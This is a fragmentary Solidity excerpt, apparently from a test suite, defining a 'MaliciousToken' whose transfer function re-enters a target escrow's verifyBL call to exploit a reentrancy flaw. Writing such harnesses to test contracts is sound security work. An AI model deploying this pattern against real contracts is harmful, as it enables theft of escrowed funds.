...
contract MaliciousToken is ERC20 {
    ...
    /// will call verifyBL on `target_` before the transfer completes,
    /// regardless of who the recipient is. The payout in verifyBL goes
    /// to the supplier, not back to the escrow, so a `to == target` check would
    /// never fire — the callback must trigger on any outbound transfer.
    function arm(address target_, uint256 escrowId_, bytes32 blRef_) external {
        target = target_;
        escrowId = escrowId_;
        blRef = blRef_;
        armed = true;
    ...
    function transfer(address to, uint256 amount) public override returns (bool) {
        if (armed) {
            ...
            IReentrantTarget(target).verifyBL(escrowId, blRef);
        }
